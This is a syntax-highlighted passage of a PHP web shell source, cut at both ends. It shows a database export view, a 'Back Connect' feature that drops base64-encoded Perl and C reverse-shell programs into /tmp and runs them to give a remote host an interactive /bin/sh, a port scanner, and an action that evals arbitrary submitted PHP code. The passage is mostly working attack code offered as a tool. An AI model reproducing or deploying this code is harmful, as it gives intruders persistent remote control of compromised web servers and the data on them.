<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td width="2%" align="center"&gt;&lt;input name="chkall" value="on"</span><span style="color: #70c0b1; text-decoration: underline;"> type="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Name&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Rows&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Data_length&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Create_time&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Update_time&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">highver</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Engine&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Operate&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/tr&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class='</span>.<span style="color: #eaeaea; background-color: #000000;">bg(</span>).<span style="color: #70c0b1;">'&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Total tables: '</span>.$<span style="color: #e7c547;">table_num</span>.<span style="color: #70c0b1;">'&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">table_rows</span>.<span style="color: #70c0b1;">'&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">data_size</span>.<span style="color: #70c0b1;">'&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td colspan="'</span>.($<span style="color: #e7c547;">highver</span> ? <span style="color: #eaeaea; background-color: #000000;">5</span> : <span style="color: #eaeaea; background-color: #000000;">3</span>).<span style="color: #70c0b1;">'"&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/tr&gt;'</span>);

<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">"&lt;tr class=\""</span>.<span style="color: #eaeaea; background-color: #000000;">bg(</span>).<span style="color: #70c0b1;">"\"&gt;&lt;td colspan=\""</span>.($<span style="color: #e7c547;">highver</span> ? <span style="color: #eaeaea; background-color: #000000;">9</span> : <span style="color: #eaeaea; background-color: #000000;">7</span>).<span style="color: #70c0b1;">"\"</span><span style="color: #70c0b1; text-decoration: underline;">&gt;&lt;input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /&gt; Save as file &lt;input class=\"input\" name=\"path\" value=\""</span><span style="text-decoration: underline;">.</span><span style="color: #d54e53; font-weight: bold; text-decoration: underline;">SA_ROOT</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">".sql\" type=\"text\" size=\"60\" /&gt; &lt;input class=\"bt\" type=\"submit\" value=\"Export selection table\" /&gt;&lt;/td&gt;&lt;/tr&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'doing'</span>,<span style="color: #70c0b1;">'backupmysql'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfoot(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">"&lt;/table&gt;"</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">fr(</span>$<span style="color: #e7c547;">query</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">tbfoot(</span>);
<span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">mysql_close(</span>);
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end mysql</span>

<span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">action</span> == <span style="color: #70c0b1;">'backconnect'</span>) {
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">yourip</span> &amp;&amp; $<span style="color: #e7c547;">yourip</span> = $<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'REMOTE_ADDR'</span>];
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">yourport</span> &amp;&amp; $<span style="color: #e7c547;">yourport</span> = <span style="color: #70c0b1;">'12345'</span>;
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">usedb</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'perl'</span>=&gt;<span style="color: #70c0b1;">'perl'</span>,<span style="color: #70c0b1;">'c'</span>=&gt;<span style="color: #70c0b1;">'c'</span>);

<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">back_connect</span>=<span style="color: #70c0b1;">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJ</span><span style="color: #70c0b1; text-decoration: underline;">HN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #70c0b1;">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9</span><span style="color: #70c0b1; text-decoration: underline;">ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #70c0b1;">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3</span><span style="color: #70c0b1; text-decoration: underline;">J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #70c0b1;">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JT</span><span style="color: #70c0b1; text-decoration: underline;">kVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #70c0b1;">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9y</span><span style="color: #70c0b1; text-decoration: underline;">OiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #70c0b1;">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQ</span><span style="color: #70c0b1; text-decoration: underline;">iKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #70c0b1;">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span>;
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">back_connect_c</span>=<span style="color: #70c0b1;">"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0</span><span style="color: #70c0b1; text-decoration: underline;">KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #70c0b1;">"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb</span><span style="color: #70c0b1; text-decoration: underline;">2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #70c0b1;">"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQog</span><span style="color: #70c0b1; text-decoration: underline;">c2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #70c0b1;">"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnp</span><span style="color: #70c0b1; text-decoration: underline;">lcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #70c0b1;">"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSV</span><span style="color: #70c0b1; text-decoration: underline;">BQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #70c0b1;">"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8M</span><span style="color: #70c0b1; text-decoration: underline;">Ckgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #70c0b1;">"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1z</span><span style="color: #70c0b1; text-decoration: underline;">KTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #70c0b1;">"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiB</span><span style="color: #70c0b1; text-decoration: underline;">jbG9zZShmZCk7IA0KfQ=="</span><span style="text-decoration: underline;">;</span>

<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">start</span> &amp;&amp; $<span style="color: #e7c547;">yourip</span> &amp;&amp; $<span style="color: #e7c547;">yourport</span> &amp;&amp; $<span style="color: #e7c547;">use</span>){
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">use</span> == <span style="color: #70c0b1;">'perl'</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">cf(</span><span style="color: #70c0b1;">'/tmp/angel_bc'</span>,$<span style="color: #e7c547;">back_connect</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">res</span> = <span style="color: #eaeaea; background-color: #000000;">execute(which(</span><span style="color: #70c0b1;">'perl'</span>).<span style="color: #70c0b1;">" /tmp/angel_bc $yourip $yourport &amp;"</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">cf(</span><span style="color: #70c0b1;">'/tmp/angel_bc.c'</span>,$<span style="color: #e7c547;">back_connect_c</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">res</span> = <span style="color: #eaeaea; background-color: #000000;">execute(</span><span style="color: #70c0b1;">'gcc -o /tmp/angel_bc /tmp/angel_bc.c'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">unlink(</span><span style="color: #70c0b1;">'/tmp/angel_bc.c'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">res</span> = <span style="color: #eaeaea; background-color: #000000;">execute(</span><span style="color: #70c0b1;">"/tmp/angel_bc $yourip $yourport &amp;"</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">"Now script try connect to $yourip port $yourport ..."</span>);
<span style="background-color: #424242;"> </span>   }

<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'Back Connect'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>,<span style="color: #70c0b1;">'backconnect'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;p&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'Your IP:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'yourip'</span>,<span style="color: #70c0b1;">'size'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">20</span>,<span style="color: #70c0b1;">'value'</span>=&gt;$<span style="color: #e7c547;">yourip</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'Your Port:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'yourport'</span>,<span style="color: #70c0b1;">'size'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">15</span>,<span style="color: #70c0b1;">'value'</span>=&gt;$<span style="color: #e7c547;">yourport</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'Use:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeselect(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'use'</span>,<span style="color: #70c0b1;">'option'</span>=&gt;$<span style="color: #e7c547;">usedb</span>,<span style="color: #70c0b1;">'selected'</span>=&gt;$<span style="color: #e7c547;">use</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'start'</span>,<span style="color: #70c0b1;">'value'</span>=&gt;<span style="color: #70c0b1;">'Start'</span>,<span style="color: #70c0b1;">'type'</span>=&gt;<span style="color: #70c0b1;">'submit'</span>,<span style="color: #70c0b1;">'class'</span>=&gt;<span style="color: #70c0b1;">'</span><span style="color: #70c0b1; text-decoration: underline;">bt'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/p&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfoot(</span>);
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end</span>

<span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">action</span> == <span style="color: #70c0b1;">'portscan'</span>) {
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">scanip</span> &amp;&amp; $<span style="color: #e7c547;">scanip</span> = <span style="color: #70c0b1;">'127.0.0.1'</span>;
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">scanport</span> &amp;&amp; $<span style="color: #e7c547;">scanport</span> = <span style="color: #70c0b1;">'21,25,80,110,135,139,445,1433,3306,3389,5631,4395</span><span style="color: #70c0b1; text-decoration: underline;">8'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'Port Scan'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>,<span style="color: #70c0b1;">'portscan'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;p&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'IP:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'scanip'</span>,<span style="color: #70c0b1;">'size'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">20</span>,<span style="color: #70c0b1;">'value'</span>=&gt;$<span style="color: #e7c547;">scanip</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'Port:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'scanport'</span>,<span style="color: #70c0b1;">'size'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">80</span>,<span style="color: #70c0b1;">'value'</span>=&gt;$<span style="color: #e7c547;">scanport</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'startscan'</span>,<span style="color: #70c0b1;">'value'</span>=&gt;<span style="color: #70c0b1;">'Scan'</span>,<span style="color: #70c0b1;">'type'</span>=&gt;<span style="color: #70c0b1;">'submit'</span>,<span style="color: #70c0b1;">'class'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #70c0b1; text-decoration: underline;">'bt'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/p&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfoot(</span>);

<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">startscan</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;h2&gt;Result &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;ul class="info"&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span>(<span style="color: #eaeaea; background-color: #000000;">explode(</span><span style="color: #70c0b1;">','</span>, $<span style="color: #e7c547;">scanport</span>) <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">port</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">fp</span> = @<span style="color: #eaeaea; background-color: #000000;">fsockopen(</span>$<span style="color: #e7c547;">scanip</span>, $<span style="color: #e7c547;">port</span>, &amp;$<span style="color: #e7c547;">errno</span>, &amp;$<span style="color: #e7c547;">errstr</span>, <span style="color: #eaeaea; background-color: #000000;">1</span>);<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!$<span style="color: #e7c547;">fp</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;li&gt;'</span>.$<span style="color: #e7c547;">scanip</span>.<span style="color: #70c0b1;">':'</span>.$<span style="color: #e7c547;">port</span>.<span style="color: #70c0b1;">' ------------------------ &lt;span styl</span><span style="color: #70c0b1; text-decoration: underline;">e="font-weight:bold;color:#f00;"&gt;Close&lt;/span&gt;&lt;/li&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>  } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;li&gt;'</span>.$<span style="color: #e7c547;">scanip</span>.<span style="color: #70c0b1;">':'</span>.$<span style="color: #e7c547;">port</span>.<span style="color: #70c0b1;">' ------------------------ &lt;span styl</span><span style="color: #70c0b1; text-decoration: underline;">e="font-weight:bold;color:#080;"&gt;Open&lt;/span&gt;&lt;/li&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">fclose(</span>$<span style="color: #e7c547;">fp</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>  }<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/ul&gt;'</span>);
<span style="background-color: #424242;"> </span>   }
}

<span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">action</span> == <span style="color: #70c0b1;">'eval'</span>) {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">phpcode</span> = <span style="color: #eaeaea; background-color: #000000;">trim(</span>$<span style="color: #e7c547;">phpcode</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">phpcode</span>){
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!<span style="color: #eaeaea; background-color: #000000;">preg_match(</span><span style="color: #70c0b1;">'#&lt;\?#si'</span>, $<span style="color: #e7c547;">phpcode</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">phpcode</span> = <span style="color: #70c0b1;">"&lt;?php\n\n{$phpcode}\n\n?&gt;"</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">eval(</span><span style="color: #70c0b1;">"?"</span>.<span style="color: #70c0b1;">"&gt;$phpcode&lt;?"</span>);
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'title'</span>=<span style="color: #7aa6da;">&gt;</span><span style="color: #70c0b1;">'Eval PHP Code'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>,<span style="color: #70c0b1;">'eval'</span>);
